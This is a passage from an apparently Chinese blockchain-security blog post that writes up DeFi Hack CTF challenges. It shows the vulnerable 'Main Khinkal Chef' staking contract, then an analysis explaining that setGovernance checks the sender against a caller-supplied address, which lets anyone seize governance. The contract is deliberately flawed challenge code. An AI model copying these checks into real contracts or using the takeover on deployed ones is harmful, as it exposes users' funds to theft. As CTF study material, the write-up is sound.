Update reward variables of the given pool to be up-to-date.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">updatePool</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">uint256</span> _pid\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        PoolInfo <span class=\"token keyword\">storage</span> pool <span class=\"token operator\">=</span> poolInfo<span class=\"token punctuation\">[</span>_pid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number <span class=\"token operator\">&lt;=</span> pool<span class=\"token punctuation\">.</span>lastRewardBlock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token builtin\">uint256</span> lpSupply <span class=\"token operator\">=</span> pool<span class=\"token punctuation\">.</span>lpToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>lpSupply <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            pool<span class=\"token punctuation\">.</span>lastRewardBlock <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>number<span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token builtin\">uint256</span> multiplier <span class=\"token operator\">=</span> <span class=\"token function\">getMultiplier</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">.</span>lastRewardBlock<span class=\"token punctuation\">,</span> block<span class=\"token punctuation\">.</span>number<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> khinkalReward <span class=\"token operator\">=</span>\n            multiplier<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>khinkalPerBlock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">.</span>allocPoint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span>\n                totalAllocPoint\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        khinkal<span class=\"token punctuation\">.</span><span class=\"token function\">mint</span><span class=\"token punctuation\">(</span>devaddr<span class=\"token punctuation\">,</span> khinkalReward<span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        khinkal<span class=\"token punctuation\">.</span><span class=\"token function\">mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> khinkalReward<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        pool<span class=\"token punctuation\">.</span>accKhinkalPerShare <span class=\"token operator\">=</span> pool<span class=\"token punctuation\">.</span>accKhinkalPerShare<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n            khinkalReward<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token number\">1e12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span>lpSupply<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        pool<span class=\"token punctuation\">.</span>lastKhinkalReward <span class=\"token operator\">=</span> khinkalReward<span class=\"token punctuation\">;</span>\n        pool<span class=\"token punctuation\">.</span>lastRewardBlock <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>number<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Deposit LP tokens to MainChef for KHINKAL allocation.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _pid<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        PoolInfo <span class=\"token keyword\">storage</span> pool <span class=\"token operator\">=</span> poolInfo<span class=\"token punctuation\">[</span>_pid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        UserInfo <span class=\"token keyword\">storage</span> user <span class=\"token operator\">=</span> userInfo<span class=\"token punctuation\">[</span>_pid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">updatePool</span><span class=\"token punctuation\">(</span>_pid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span>amount <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token builtin\">uint256</span> pending <span class=\"token operator\">=</span>\n                user<span class=\"token punctuation\">.</span>amount<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">.</span>accKhinkalPerShare<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span><span class=\"token number\">1e12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>\n                    user<span class=\"token punctuation\">.</span>rewardDebt\n                <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>pending <span class=\"token operator\">&lt;=</span> pool<span class=\"token punctuation\">.</span>lastKhinkalReward<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Reward bigger than minted\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>pending <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                khinkal<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> pending<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            khinkal<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> pending<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        pool<span class=\"token punctuation\">.</span>lpToken<span class=\"token punctuation\">.</span><span class=\"token function\">safeTransferFrom</span><span class=\"token punctuation\">(</span>\n            <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            _amount\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        user<span class=\"token punctuation\">.</span>amount <span class=\"token operator\">=</span> user<span class=\"token punctuation\">.</span>amount<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>_amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        user<span class=\"token punctuation\">.</span>rewardDebt <span class=\"token operator\">=</span> user<span class=\"token punctuation\">.</span>amount<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">.</span>accKhinkalPerShare<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span><span class=\"token number\">1e12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Deposit</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> _pid<span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Withdraw LP tokens from MainChef.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _pid<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        PoolInfo <span class=\"token keyword\">storage</span> pool <span class=\"token operator\">=</span> poolInfo<span class=\"token punctuation\">[</span>_pid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        UserInfo <span class=\"token keyword\">storage</span> user <span class=\"token operator\">=</span> userInfo<span class=\"token punctuation\">[</span>_pid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">updatePool</span><span class=\"token punctuation\">(</span>_pid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> pending <span class=\"token operator\">=</span>\n            user<span class=\"token punctuation\">.</span>amount<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">.</span>accKhinkalPerShare<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span><span class=\"token number\">1e12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>\n                user<span class=\"token punctuation\">.</span>rewardDebt\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>pending <span class=\"token operator\">&lt;=</span> pool<span class=\"token punctuation\">.</span>lastKhinkalReward<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Reward bigger than minted\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>pending <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            khinkal<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> pending<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span>amount <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            pool<span class=\"token punctuation\">.</span>lpToken<span class=\"token punctuation\">.</span><span class=\"token function\">safeTransfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">.</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            user<span class=\"token punctuation\">.</span>amount <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n            user<span class=\"token punctuation\">.</span>rewardDebt <span class=\"token operator\">=</span> user<span class=\"token punctuation\">.</span>amount<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">.</span>accKhinkalPerShare<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span><span class=\"token number\">1e12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Withdraw</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> _pid<span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">.</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Withdraw without caring about rewards. EMERGENCY ONLY.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">emergencyWithdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _pid<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        PoolInfo <span class=\"token keyword\">storage</span> pool <span class=\"token operator\">=</span> poolInfo<span class=\"token punctuation\">[</span>_pid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        UserInfo <span class=\"token keyword\">storage</span> user <span class=\"token operator\">=</span> userInfo<span class=\"token punctuation\">[</span>_pid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        pool<span class=\"token punctuation\">.</span>lpToken<span class=\"token punctuation\">.</span><span class=\"token function\">safeTransfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">.</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">EmergencyWithdraw</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> _pid<span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">.</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        user<span class=\"token punctuation\">.</span>amount <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        user<span class=\"token punctuation\">.</span>rewardDebt <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Update governance address by the governance.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setGovernance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _governance<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> <span class=\"token function\">owner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> _governance<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Access denied\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        governance <span class=\"token operator\">=</span> _governance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Update dev address by the previous dev.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">dev</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> _devaddr\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> <span class=\"token function\">owner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> devaddr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Access denied\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        devaddr <span class=\"token operator\">=</span> _devaddr<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Analyze-4\"><a href=\"#Analyze-4\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h3><p>函数setGovernance处require判断条件有误，msg.sender &#x3D;&#x3D; <strong>_governance</strong>， _governance为可控参数，所以可以将governance设置为hacker</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/IMG_5D93ECC48136-1.jpg\"></p>\n","text":"题库地址：https://www.defihack.xyz/ Defi Hack1.May The Force Be With You RequestA long time ago in a galaxy far, far away… a new DAO was created....","link":"","photos":[],"count_time":{"symbolsCount":"53k","symbolsTime":"48 mins."},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":20,"path":"api/tags/区块链.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Defi-Hack\"><span class=\"toc-text\">Defi Hack</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-May-The-Force-Be-With-You\"><span class=\"toc-text\">1.May The Force Be With You</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Request\"><span class=\"toc-text\">Request</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Code\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Analyze\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Attack\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-DiscoLP\"><span class=\"toc-text\">2.DiscoLP</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Request-1\"><span class=\"toc-text\">Request</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Code-1\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Analyze-1\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Attack-1\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-P2PSwapper\"><span class=\"toc-text\">3.P2PSwapper</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Request-2\"><span class=\"toc-text\">Request</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Code-2\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Analyze-2\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Attack-2\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4-FakerDAO\"><span class=\"toc-text\">4.FakerDAO</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Request-3\"><span class=\"toc-text\">Request</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Code-3\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Analyze-3\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Attack-3\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5-Main-Khinkal-Chef\"><span class=\"toc-text\">5.Main Khinkal Chef</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#request\"><span class=\"toc-text\">request</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Code-4\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Analyze-4\"><span class=\"toc-text\">Analyze</span></a></li></ol></li></ol></li></ol>","author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/202311061840946.gif","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Damn Vulnerable Defi","uid":"3e4e5e9b128bda97a530bf234e940a7f","slug":"Damn Vulnerable DeFi","date":"2022-08-02T02:49:20.316Z","updated":"2022-12-16T07:13:36.841Z","comments":true,"path":"api/articles/Damn Vulnerable DeFi.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-w/images1/img/202208011817429.png","text":"地址：https://www.damnvulnerabledefi.xyz/ 1.Unstoppable 题目要求： There’s a lending pool with a million DVT tokens in balance, offering flash loans...","link":"","photos":[],"count_time":{"symbolsCount":"70k","symbolsTime":"1:03"},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":20,"path":"api/tags/区块链.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/202311061840946.gif","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Ethernaut","uid":"d254f0c02017b2eb8e14e9b15540cca1","slug":"ethernaut","date":"2022-08-02T02:42:37.160Z","updated":"2022-12-16T07:17:08.118Z","comments":true,"path":"api/articles/ethernaut.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-w/images1/img/202208011808700.svg","text":"地址https://ethernaut.openzeppelin.com/ 1.fallback 题目要求：获得合约所有权并将余额变成0 Codepragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMa...","link":"","photos":[],"count_time":{"symbolsCount":"66k","symbolsTime":"1:01"},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":20,"path":"api/tags/区块链.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/202311061840946.gif","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}